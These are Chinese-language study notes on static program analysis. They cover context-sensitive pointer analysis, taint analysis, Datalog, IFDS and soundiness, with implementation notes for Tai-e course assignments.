Heap\n给抽象的堆当中加入上下文，得到粒度更细的堆抽象\n\n为什么会有用？\n每一个创建出的对象会根据不同的数据流给予不同操作\n\nexp\n没有上下文敏感堆抽象的分析，实际上x1和x2是指向两个对象的，因此导致最后newX方法的结果合并到一个对象中去了\n\n有上下文敏感堆抽象的分析\n\n但是如果只给heap加上下文，不给变量加上下文\n\n也就是说两者需要共同作用才能更好提升精度\n\n规则\nDomains and Notations \n\nRules\n\nNew语句，变量在上下文c之下，指向在上下文C之下创建的对象$o_i$(堆抽象也加上下文)\n\nAssign赋值语句，x和y在同一上下文中\n\nStore语句，分别取x和y在上下文c中所指向的对象\n\nLoad语句，先去找x在上下文c中指向的对象，在找x.f指向的对象\n\nCall语句，首先找到receiver object x在上下文c中指向的对象。然后dispatch出对应的方法（根据方法签名和receiver object），其次要去选择对应上下文中的方法，定义Select方法，根据调用点l拿到的所有信息来选择上下文\n\n\nexp\n\n之后传receiver object 给指定$c^t$上下文中的方法m，然后传参数也是如此。最后传返回值，返回给指定上下文的变量（这个调用点和目标上下文方法是关联的，知道数据流的流动来源）\n\n\n12 - Pointer Analysis - Context Sensitivity II\n上下文敏感指针分析算法\nPointer Flow Graph with C.S.\n结点：程序当中上下敏感的指针（变量或者对象的field），每个结点都带有上下文信息\n边：指针流向关系\n\n 对于调用方法的规则，主要传参和返回值时上下文的选择\n\n算法\n\nRM代表已经可达的带有上下文信息的方法\ncall site和 callee都要有上下文（更准确）\n\nAddReachable\n入口方法给一个空的上下文\n对于new语句，堆抽象的上下文来自方法传进来的上下文\n\nPropagate方法和AddEdge方法和CI一样\n这里x和y的上下文是一样的，这样保证了不同方法分析时是出于不同上下文下\n\nProcessCall\n这里最关键的一步是选出上下文Select函数\nc就是调用点所在上下文，l代表调用点 c’ 代表receiver object所在上下文\n\n\nSelect函数如何选择\n\n仅考虑其中一两个参数作为上下文的选择\n上下文敏感 Varints\n\n调用点敏感\n每个上下文由一系列调用点构成一个call chain. 本质上就是对调用栈的抽象\n\nexp\n\n对于递归调用，则将会有无穷个上下文。因此需要保证算法能够终止，采用k-Limiting Context Abstraction，限制调用链长度\n\n假设k取1\n\n一般k取2 保留最后一个上下文\nexp\n\n\n处理方法m中的AddReachable\n\n处理worklist剩余指针对，调用id方法 传参 传返回值\n\n与15行调用的对比\n\n继续处理worklist\n\n与上下文不敏感对比，前者则会将数据流混在一起，x和y一定会有误报出现\n\n\n对象敏感\n对于OO语言，对receiver object作为上下文策略\n\nexp\n\na1.get()调用时即可很容易得到this来自上下文o1 this.f即o1.f也就是指向o3\n每个this变量一定是上下文本身\n与 1-call-site作对比，前者是不能够分开的，就是因为在doSet方法这里有一个数据流汇合\n\n\n但是对于刚才的程序，1-object就不行，因为这里this是一样的\n\n\n类型敏感\n基于对象敏感技术的进一步抽象\n调用点 receiver object 所在的类型作为上下文\n\n对象敏感粗粒度的抽象\nexp\n\n\n\n\n\n实验6 上下文敏感的指针分析\n新处理规则\n\n静态字段\n\n\n数组索引\n常规的指针分析不区别对针对同一数组不同位置的 store 和 load\n\n\n静态方法\n\n1）不需要在 receiver object 上通过 dispatch 来解析出被调用方法。2）不需要传递 receiver object\n\n\n\n\n\n需要了解的类\nIR、Var、InvokeExp 以及 DefinitionStmt的子类 JMethod、JField、Obj和HeapModel\n\npascal.taie.analysis.pta.core.cs.context.Context\n该类表示上下文敏感的指针分析中的上下文\n\npascal.taie.analysis.pta.core.cs.element.CSElement\n该类表示指针分析中需要用到上下文的元素，每个这样的元素都和一个上下文相关联。四个子类如下\n\n\npascal.taie.analysis.pta.core.cs.element.Pointer\n该类表示上下文敏感指针分析中的指针，每个 Pointer 和一个 PointsToSet 相关联，通过调用getPointsToSet()取得\n\n\npascal.taie.analysis.pta.core.cs.element.CSManager\n该类管理所有需要用到上下文的元素和所有上下文敏感的指针。\n\npascal.taie.analysis.pta.core.cs.selector.ContextSelector\n\n该类是上下文敏感指针分析框架和具体的上下文敏感策略（如调用点敏感、对象敏感等）之间的接口。\n该类有 4 个 API，其中一个 API 返回空上下文，另外三个 API 分别为静态方法、实例方法和堆对象（heap object）选择上下文。\n当你在上下文敏感指针分析中处理 Invoke 和 New 语句时，你需要使用本类的各个子类中的方法来生成目标方法（Invoke 语句）和新创建对象（new 语句）的上下文。\n\n\npascal.taie.analysis.pta.core.cs.CSCallGraph\n该类表示上下文敏感的调用图.你需要使用其中的 addReachableMethod(CSMethod) 以及 addEdge(Edge) 这两个 API 来修改调用图。\n\npascal.taie.analysis.pta.pts.PointsToSet\n可迭代\n\npascal.taie.analysis.pta.pts.PointsToSetFactory\n该类提供创建 PointsToSet 的静态工厂方法。\n\n\npascal.taie.analysis.pta.cs.PointerFlowGraph\n该类表示程序的指针流图 PFG\n\npascal.taie.analysis.pta.cs.WorkList\n该类表示指针分析算法中的 WorkList。\n\npascal.taie.analysis.pta.cs.Solver\nAPI1: void addReachable(CSMethod)\n原理如下\n\n\n方法 Solver.resolveCallee(CSObj,Invoke) 用于解析各种方法调用的被调用方法\n\n这里依然采用访问者模式来处理方法中的不同类型语句，不同点在于这里加上了上下文，因此不能再用同一个StmtProcessor，在用的时候创建即可；其次，我们需要注意对于New 和 Invoke语句要ContextSelector类生成上下文\n\n然后利用csManager，来获得带有上下文的指针\n对于静态方法调用，不需要dispatch和传this变量，其他参考\n\n依然记得resolveCallee对于静态方法来说，其recv设为null即可。同时，要分清调用点方法的上下文以及调用者所在上下文之间的关系。\nAPI2: void addPFGEdge(Pointer,Pointer)\n原理如下\n\nAPI3:  void analyze()\n实现  Solve方法中while 循环的部分\n基本不变，指针获取方式改一下就行\nAPI4： PointsToSet propagate(Pointer,PointsToSet)\n和上次作业一样先算差集\n\nAPI5：void processCall(CSVar,CSObj) \n把处理静态方法的改一下就好\n\n\n\n\n实现常见的上下文敏感策略\n需要了解的类\n\npascal.taie.analysis.pta.core.cs.selector.ContextSelector\n实现另外6个子类\n\n分别对应即调用点敏感（call-site sensitivity）、对象敏感（object sensitivity）和类型敏感（type sensitivity）。对每个策略，你需要分别实现两个 selector（分别针对 k-limiting 的上下文中的k=1 和 k=2）\n\npascal.taie.analysis.pta.core.cs.context.ListContext\n\n该类实现了 Context 接口，它将每个上下文表示为一个由若干同类型元素组成的有序列表（对三种上下文敏感策略，该列表分别采用不同的元素来表示上下文：调用点敏感使用的元素为 Invoke，对象敏感使用的元素为 Obj，类型敏感使用的元素为 Type）。\n该类提供一系列静态工厂方法，即 make(...) 方法来创建上下文。\n对每个k 层的 context selector，其堆上下文（heap context）的层数为 k-1\n\n首先是调用点敏感上下文\n对于1层的实现，其堆上下文的层数为0层，因此直接返回一个空集即可；对于静态方法的调用点上下文和实例方法，由于只有一层，因此直接返回调用点的上下文即可。对于两层的实现，其堆上下文的层数为1。细节在于其堆上下文继承于调用方法的上下文，因此直接选取调用方法的上下文并作筛选层数即可。我们要注意，调用点敏感使用的元素为 Invoke，对象敏感使用的元素为 Obj，类型敏感使用的元素为 Type），这个也就是ListContext类修改上下文时所操作的元素，对于调用实例方法，我们只需要将调用点的上下文与调用者组合在一起即成为被调用方法的上下文；而对于静态方法调用，由于调用者本身并没有上下文，所以只需要传递调用点上下文即可\n\n\n其次是对象敏感上下文，对象敏感使用的元素为 Obj。对于静态方法调用，直接地使用调用者方法的上下文作为被调用方法的上下文。对于堆上下文的选择，是不用创建新的上下文的，因为其是基于对象进行的选择，这里并没有新的recv object，只是需要降为k-1层堆上下文即可\n\n\n\n\n\n最后是类型敏感，其是对象敏感的进一步抽象，取调用点所在类的类型作为上下文的元素\n\n![image-20221229102933241](静态分析/image-20221229102933241.png)\n13 - Static Analysis for Security\n信息流安全\n本质目标：保护信息安全，阻止危险的信息流\n常见手段：访问控制但是不足，无法获知拿到信息之后的情况\n\n信息流的定义 \n\n信息流如何与安全进行结合？\n为程序中的变量设定等级，且规定不同等级之间的信息如何进行流动（指定策略）\n安全等级\n基本模型采取两级策略\n\n分级也可以用格的概念来表示，因为之间具有偏序关系\n\n信息流策略\n非干涉策略\n\npublic的内容可以被外界观测到的，也就是说不能通过外界观测到的public中的信息反推测出secret中的信息\n\n高密级信息不能流向低密级，从格的角度来看，信息流只能往上流动\n\n\n保密性和完整性\n组织隐私信息被观测到 -&gt; 保密性\n完整性：阻止的是不可信任的信息，防止它们污染我们关键的信息\n也就是说完整性阻止的信息流是反向的\n\n\n显式流和隐藏信道（程序中信息流动的方式）\n直接通过copy方式的叫做显式流\n隐式流：\n\n当然，这种由密码信息泄露的控制带来的副作用要可以被观测到\n这里如果能观测到异常的话比如数组越界，仍然能推断出秘密的信息\n\n这一类信息称为隐藏信道，其本身机制的目的并不是为了信息传递\n\n\n通常情况下显式流携带的隐藏信息更多，隐藏信道携带的隐藏信息有限，因此我们更多关注显式流\n\n污点分析\n将数据分为两类，污点数据是我们所关注的数据，打上标记方便追踪\n其他数据即不关心数据\n污点数据的源头称为source，污点分析关心数据流是否会流动到特定的位置（sinks）\n两类应用：保密性和完整性\n\n指针分析与污点分析的关系\n一个污点数据是否能流到sinks? -&gt; 调用sink方法的指针是否可以指向一个污点数据？\n把污点数据视为一类特殊的object，把source视作allocation sites，也就是调用source时产生的污点数据\n\n如何借助指针分析实现污点分析\n首先需要拓展域（上下文不敏感指针分析为例）\n\n规定输入和输出\n\n规则\n\n处理source\n产生污点数据\n\n传播污点数据\n规则与指针分析是一样的\n\n处理sinks\n如果方法为sinks方法，则遍历方法参数的指针集，若其中发现了污点数据，则会产生一个taintflows输出当中\n\n\n\nexp\n\n\n\n14 - Datalog-Based Program Analysis\nDatalog\n本身是一个声明式逻辑语言\n\nData部分：以谓词的形式表示\n什么是谓词？一系列陈述的集合，陈述了不同客体之间的事实，可以看作是一张表\n\nfact可以看作表中的一行，由值构成的元组是表中的一行\n基本元素 Atoms\n\n$P(X1, X2, \\dots, Xn)$ 也叫作关系型谓词，Datalog也有算术型谓词 如 $age \\geq 18$\n\nDatalog Rules (Logic)\n如何根据已有的谓词推导出新的谓词\n推导式形式：\n\n逗号可以看作逻辑与\n如何去解读规则？枚举所有可能的谓词组合，当所有子目标为真时，head也为真，即可推导出一个新的谓词\n\nexp\n\n\n最开始的Facts从哪来的呢？\nDatalog的谓词划分为两类\n\n逻辑或关系的表示\n\n写多条rules\n\n\n使用分号逻辑运算符\n\n\n\n逻辑非的表示\n可以是原子目标的取反\n\n支持递归Recursion规则\nIDB可以直接或间接从自身推导出来\n例如图的可达性\n\n规则的安全性\n对于第一个，如果y属于B且是EDB类型的，那么就会存在无穷多个x，也就推导无穷个谓词来；右边同理\n\n因此为了避免这种情况，变量必须出现在谓词当中且无非逻辑出现，这样相当于变量是有限的，因为表是有限的\n\n还有一种可能出现问题的情况：Recursion and Negation\n\n\n原子如果能递归的推导出它的非是没有意义的，会出现环的情况\n因此Datalog的fact是单调的，且一定是有限的（为了满足规则的安全性）\n\n实现指针分析\nEDB：从程序语法上可以直接提取的指针信息\nDatalog下谓词表示\n\nexp\nEDB输入\n\n规则的定义（流不敏感）\n\n实际处理过程\n\n\n\n方法调用如何处理\n规则如下\n规则1\n\n规则2，传参数\n调用点l第i个参数对应的变量a\n\n规则3 传返回值\n\n全程序指针分析Datalog实现\n加一条入口方法的规则；处理New的时候也加一个限定，表示allocation site在哪个 Reachable方法当中，而对于其他条件都依赖于指向关系，当没有时都不会触发\n\n\nDatalog实现污点分析\nEDB和IDB谓词声明\nTaint谓词把每个call site关联其产生的污点数据\n\n如果t污点数据流到sinks方法，而t也跟call site关联\n规则描述\n\nsinks的call中不关心参数的下标\n\n\n实验7 Alias-Aware的常量传播\n别名 \n\n指向内存中的同一位置的不同符号互为别名\n在别名存在的情况下，通过对一个字段/数组的访问来修改一个实例字段/数组将会同时修改与这一访问相关的所有别名值。\nJava 中的静态字段不能拥有别名\n\n\n分析实例字段\n\n我们找到所有对这一实例字段（以及其别名）进行修改的 store 语句，并将这些语句要 store 的值 meet 之后赋给 L 等号左侧的变量。\n\n那么别名信息是怎么计算的呢？\n\n对任意两个实例字段的访问（设为 x.f 和 y.f），如果它们的 base 变量的指针集（points-to set）有交集（即 x 和 y 的指针集有交集），那么我们认为对这两个实例字段的访问（x.f 和 y.f）互为别名\n\n\n分析静态字段\n\n当处理一个静态字段的 load 语句时（假设为 x = T.f;），你只需要找到对同一个字段（T.f）的 store 语句，并将这些保存进字段的值进行 meet 后赋给 load 语句等号左侧的变量（x）\n\n\n分析数组\n与之前处理实例字段的方式类似。\n\n当你判断两个对数组的访问 a[i] 和 b[j] 是否互为别名时，你不仅需要考虑它们的 base 变量（a 和 b）的指针集是否有交集，还需要考虑索引值 i 和 j 的关系。\n\n索引关系也可以通过常量分析来得到\n\n特别说明：在 Java 中，和局部变量不同，字段（包括实例字段和静态字段）和数组即使没有被显式地初始化过也能被 load，这是因为 Java 会隐式地给 int 类型赋初始值为 0\n这样会导致所有对字段和数组的处理都将无意义，因为load的值由于meet操作全变成了NAC(一旦有显示的store情况出现)，因此需要作出假设：假设所有程序中的字段和数组都在被 load 之前通过 store 语句显式地初始化了，忽略隐式初始化带来的影响\n\n需要了解的类\n\npascal.taie.analysis.pta.PointerAnalysisResult\n提供了一系列查询指针分析结果的 API\n\npascal.taie.ir.exp.ArrayAccess\n数组访问表达式\n\n该类的实例在类 StoreArray 和 LoadArray 的实例中出现\n\n\n\n\n实验\n更加精确地处理实例字段、静态字段和数组\n我们实际上需要做的工作，首先就是维护一个别名关系。对于实例而言，当进行load/store操作时，先查找到其所有与对象关联的别名变量，进而收集所有的store/load语句，再运用meet操作计算最终的常量值。如何查找关联别名变量，就需要利用指针分析结果，这里利用到了Java中的一个特殊数据结构collection：MultiMap，该map支持相同的重复的键，便于我们通过一个变量查找到所有关联的别名变量\n\n\n对于常数传播，我们实际上只需额外的考虑实例/静态的load/store和数组的load/array即可，其他情况均与之前的一样。对于实例变量，我们需要找到关联的别名变量的相关语句进行meet值操作；而对于静态变量，由于其没有相关语句的关联，因此一种办法就是遍历icfg上的所有stmt，进一步判断是否为静态变量\n这里也需要针对store语句说明一下，因为一条语句的set操作需要同样对其关联的所有别名变量也作set操作\n\n\n对于store语句，则需要把所有的别名的load加入到worklist中再次进行更新。这是因为有时候对象的field是通过getter和setter更新的，而如果在分析时先分析了getter再分析setter就会出现setter中赋的值在getter中拿不到的问题，所以setter更新时将别名的所有load语句加入worklist，就和输出变化后将后继节点加入更新传递一样\n\n\n\n15 - CFL-Reachability and IFDS如何用图可达的方式来表示程序分析？\n我们希望尽可能误报少，也就是污点数据仅可能的少流动。尽可能的避免不合理的路径出现，但是如何避免呢？\n\nRealizable Paths: 通过上下文敏感指针分析识别？\n\n\n\n  一种简单的识别方式利用括号匹配\n  系统的识别方式：CFL-Reachability\n\n  只要A和B之间有边构成，且各个边上的label构成的单词必须是规定的合法单词(上下文无关文法产生的单词)\n  context-free grammer (CFG)\n\n  通过CFL实现部分括号匹配问题\n  可以有左括号但是没有括号的情况，代表有call但没return\n\n  exp\n\n\nIFDS\n直接把程序分析过程用图可达性来表达，而没有按照之前传播的方式\nIFDS满足在有限域上，且flow functions 要求是distributive的（类似分配律？）\n\nmeet-over-all-realizable-paths(MRP)\n只对realizable paths 应用path function\n\nIFDS大致轮廓\n前提\n\n将superGraph分解，在其上遍历通过Tabulation algorithm来解决问题\n\n实现目标\nSupergraph 里面存在的特征元素\n\n三类特殊的边 call-to-return-site call-to-start exit-to-return-site\n\n设计 flow functions\nlambda expression\n\n找出程序中哪些变量还没有被初始化\n括号中输出值为未初始化变量\n\ncall与ret之间的边要有kill操作，为了精度提高的问题（实际上call-ret是没有这条边的），g有无真正初始化取决于右边的cfg\n\n返回边把形参kill掉，符合作用域生命周期\n\n如何分解supergraph，通过flow functions转换成representation relations，fact中要加个0并复制一倍，边的条数为 $(D+1)^2$ \n\nflow function转化成一种映射关系\n\n最后两个关系表示 如果有非0 node到y的边，那么就不存在0到y的边\n\n\n为什么需要0边？\ndata facts的真正传播是通过一系列flow function调用起来的；对于IFDS，0到0的边实际上就是将一个个representation relation(flow functions)连接起来，这样才能表达出来图的可达性\n\n下面开始构建分解的flow graph，实际上就是flow function到representation relation的映射表示\n\n如果能够reach到最后的结点g，则是可达的\n\n怎么样把最终的可达性结点找出来呢？Tabulation algorithm\n定义 \n\n算法的核心工作机理\n如果只关注一个 data fact，就是一点点去探索可达边，并标记可达结点。对于call边，先标记入口方法的结点 data fact，当在处理每个程序的 exit node时，开始进行括号匹配（call-to-return 匹配）。其中还会加一个summary edge，表示到 call 到 ret也是间接可达的，因为其中可能还有其他call方法未处理（相同的调用过程），这时就可以直接通过summary edge连接上就可以，减少重复的处理过程\n\n如何理解IFDS的distributivity，也就是什么样的程序可以用它来分析？\n   IFD的分析框架是一次处理一个数据，等所有数据处理完之后再作meet处理\n\n因此如何判断是否可以使用IFDS来解决，取决于问题是否需要考虑多个输入才能产出一个输出，也就是输入之间是否独立\n\n对于指针分析，由于为了满足sound条件，需要考虑别名传播的话则需要多重输入同时关联，也就不满足IFDS独立性要求\n\n\n\n作业8 污点分析\n实现污点分析\ntaint sources：特定的方法（通常是产生数据的 API）\ntaint sinks：特定方法的某些参数\n\n\nSources 二元组 $$ 的集合，其中 m 表示一个被视作 source 的方法的签名，而 u 是该方法返回的污点对象的类型.\n我们用 $t_l^u$ 来表示一个污点对象，其中 u 是这个对象的类型，l 表示创建这个对象的调用点（call site）。你只需要使用空上下文作为污点对象的堆上下文（heap context）\n\n什么是污点传播？\n\n污点分析中的污点是一个更加抽象的概念——它与数据的内容相关联，因此它可以在不同的对象之间传播\n\n污点传播过程碰到各种API该如何处理其语义？\n告诉污点分析哪些方法会引发污点传播以及它们是如何传播污点的\n有三种污点传播的模式：\n\n\nBase-to-result：如果 receiver object（由 base 指向）被污染了，那么该方法调用的返回值也会被污染。StringBuilder.toString() 是这样一类方法。\nArg-to-base：如果某个特定的参数被污染了，那么 receiver object（由 base 指向）也会被污染。StringBuilder.append(String) 是这样一类方法。\nArg-to-result：如果某个特定的参数被污染了，那么该方法调用的返回值也会被污染。String.concat(String) 是这样一类方法。\n\n静态方法由于没有base变量，所以不会引起 base-to-result 和 arg-to-base 的污点传播；此外，一些方法会引起多种污点传播，例如返回值中同时包含了参数和 receiver object 的内容的情况\nTaintTransfers\n由四元组 $$ 所构成的集合，其中 m 表示会引发污点传播的方法，而污点会从 from 所表示的变量中传播到 所表示的变量中。u 表示传播后的污点（由 to 指向）的类型\n\n污点分析规则：\n\n\n需要了解的类\npascal.taie.analysis.pta.plugin.taint.Source\n表示 sources\npascal.taie.analysis.pta.plugin.taint.Sink\n表示 sinks\npascal.taie.analysis.pta.plugin.taint.TaintTransfer\n在这个类中，我们用整数来表示污点传播被对应方法引发时的 from 变量和 to 变量。具体来说，一个大于等于 0 的整数 i 表示调用点上被调用方法的第 i 个参数；-1 表示 base 变量；-2 表示接收结果的变量\npascal.taie.analysis.pta.plugin.taint.TaintConfig\n解析配置文件以及获取 sources、sinks 和污点传播信息的 API\npascal.taie.analysis.pta.plugin.taint.TaintManager\n管理污点分析中的污点对象\npascal.taie.analysis.pta.plugin.taint.TaintFlow\n分析算法检测到的 taint flows（由 source 的调用点和 sink 的调用点组成），也就是污点分析算法的结果\npascal.taie.analysis.pta.plugin.taint.TaintAnalysiss\n本次实验的关键在于在什么地方处理source sinks 和transfer规则。sinks好说，因为它依赖于最终指针分析的结果，我需要去遍历所有callsite提取出所有invoke方法，然后判断配置文件sinks方法中的污点参数是否出现在callsite参数当中\n\n对于source和transfer的处理，我们只需关注所有invoke语句即可，source本质是从方法中产生污点对象。我们需要考虑静态调用和实例调用两种情况。这里细节就在source的处理是在出现新的调用边加入到edge时进行的判断，而transfer只要污点对象发生变化时，我就需要对其进行处理将变化的值加入到worklist当中随指针分析进行传播。污点对象的变化分为参数和base两种情况，对于base的处理是在process call当中，对于参数的变化需要自己去加\n\n\n\n16 - Soundness and Soundiness\nHard Language Features for Static Analysis\n\n这样会导致由于对某些hard language features不分析而对分析结果产生很大影响\n\nSoundiness\n直觉上是sound但是没有证据支撑\n\nwell-identified 清楚的挑出来并说明是如何处理的\n\nJava Reflection\n\n如何去分析反射？\n\nString Constant analysis + Pointer Analysis\n但是如果字符串无法被静态解析出来的话就无法处理解析\n\nType Inference + String analysis + Pointer Analysis\n\n\n使用的时候推导出反射的参数\n结合Java语言类型系统\n\n\n\n\nNative Code\nJNI \nJVM提供的一种工作机制，可以使得JAVA和C/C++之间进行交互\n\n为啥难分析？\n\n难分析点在于JAVA分析器如何去处理C代码部分\n如何处理？\n对关键的native code进行手动建模\nexp\n一种常见的建模方式\n\n\n\n参考链接https://github.com/RicoloveFeng/SPA-Freestyle-Guidance/blob/main/assignments\nhttps://www.bilibili.com/video/BV1GQ4y1T7zm/?spm_id_from=333.788&amp;vd_source=b30bb93cb7d2b1714731de06a0d0cab9\nhttps://blog.z3ratu1.cn/%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E7%AC%94%E8%AE%B0.html\nhttps://github.com/Z3ratu1/Tai-e-assignments/blob/main/A3/tai-e/src/main/java/pascal/taie/analysis/dataflow/analysis/DeadCodeDetection.java\n延伸\n与动态分析结合 \n\n\n","tags":["静态分析"]}]